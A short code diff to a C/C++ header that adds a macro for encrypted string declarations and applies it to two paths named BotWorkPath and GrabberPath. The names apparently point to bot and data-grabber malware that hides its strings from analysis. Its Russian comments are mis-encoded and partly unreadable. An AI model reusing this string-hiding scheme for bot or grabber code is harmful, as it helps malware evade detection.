@@ -11,6 +11,8 @@
 
 #include "Strings.h"
 
+//тип кодируемой строки, выравниваетс€ в один байт
+#define CSSTR __declspec(align(1)) char
 
 //*****************************************************
 // GetStr - ‘ункци€ расшифровывает строку EncryptedStr
@@ -24,8 +26,8 @@ string GetStr(const char* EncryptedStr);
 //=====================================================
 //  ѕубличное обх€вление строковых данных
 //=====================================================
-extern char BotWorkPath[];
-extern char GrabberPath[];
+extern CSSTR BotWorkPath[];
+extern CSSTR GrabberPath[];
 
 
 
